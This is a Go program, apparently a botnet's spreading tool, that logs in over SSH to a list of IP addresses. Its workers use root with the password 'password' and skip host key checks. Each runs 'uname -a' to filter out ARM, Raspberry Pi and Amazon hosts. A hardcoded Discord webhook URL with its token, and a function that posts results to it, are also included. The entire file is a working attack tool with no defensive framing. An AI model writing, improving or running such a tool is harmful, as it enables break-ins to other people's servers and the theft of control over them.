package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	hardcoreWebhook = "https://discord.com/api/webhooks/1199622995040280576/Il4yqAF8NVkXa2SRFShERIqxFFXVB4DNfmNOFLEP9WAVF1khOxH8xZLSCfI4VI8OHzKG"
)

var (
	ipfile  string
	threads int
	port    string
)

// Initialize the program by processing command-line arguments
func init() {
	if len(os.Args) <= 3 {
		fmt.Println("Usage: [brute] [port] [threads] [iplist]")
		os.Exit(1)
	}
	port = os.Args[1]
	threads, _ = strconv.Atoi(os.Args[2])
	ipfile = os.Args[3]
}

// Reads lines from a file and returns them as a slice of strings
func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// Checks if the system is excluded based on the output of the `uname -a` command
func isExcludedSystem(unameOutput string) bool {
	excludedSystems := []string{"aarch", "amzn", "amzn2", "armv7l", "raspberry", "raspberrypi"}
	for _, excluded := range excludedSystems {
		if strings.Contains(unameOutput, excluded) {
			return true
		}
	}
	return false
}

// Sends a message to Discord via the webhook
func toDiscord(message DiscordMessage, webhookURL string) {
	payload, err := json.Marshal(message)
	if err != nil {
		log.Println("Error marshalling Discord message:", err)
		return
	}
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		log.Println("Error sending message to Discord:", err)
		return
	}
	defer resp.Body.Close()
}

// Structure for the Discord message
type DiscordMessage struct {
	Embeds []Embed `json:"embeds"`
}

type Embed struct {
	Title       string `json:"title,omitempty"`
	Description string `json:"description,omitempty"`
	Color       int    `json:"color,omitempty"`
	Author      Author `json:"author,omitempty"`
	Footer      Footer `json:"footer,omitempty"`
}

type Author struct {
	Name string `json:"name,omitempty"`
}

type Footer struct {
	Text string `json:"text,omitempty"`
}

// Runs the SSH command on the target host
func remoteRun(user, addr, pass, cmd string) (string, error) {
	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout: 40 * time.Second,
	}

	client, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), config)
	if err != nil {
		return "", err
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()

	var b bytes.Buffer
	session.Stdout = &b

	err = session.Run(cmd)
	if err != nil {
		return "", err
	}

	if isExcludedSystem(b.String()) {
		log.Printf("IP %s excluded due to system: %s", addr, b.String())
		return "", nil
	}

	return b.String(), nil
}

// Worker function to handle each SSH task concurrently
func worker(id int, jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for ip := range jobs {
		output, err := remoteRun("root", ip, "password", "uname -a")
		if err == nil {
			fmt.Printf("Worker %d: Success for IP %s: %s\n", id, ip, output)
		} else {
			fmt.Printf("Worker %d: Error for IP %s: %s\n", id, ip, err)
		}
	}
}

// Main function: Initializes workers, reads IPs, and controls concurrency
func main() {
	lines, err := readLines(ipfile)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}

	uniqueIPs := make(map[string]bool)
	for _, line := range lines {
		ip := strings.TrimSpace(line)
		if ip != "" {
			uniqueIPs[ip] = true
		}
	}

	var ips []string
	for ip := range uniqueIPs {
		ips = append(ips, ip)
	}

	// Create a channel to send jobs to workers
	jobs := make(chan string, len(ips))
	var wg sync.WaitGroup

	// Start the workers
	for w := 1; w <= threads; w++ {
		wg.Add(1)
		go worker(w, jobs, &wg)
	}

	// Dispatch jobs to workers
	for _, ip := range ips {
		jobs <- ip
	}
	close(jobs)

	// Wait for all workers to finish
	wg.Wait()
	fmt.Println("Execution completed")
}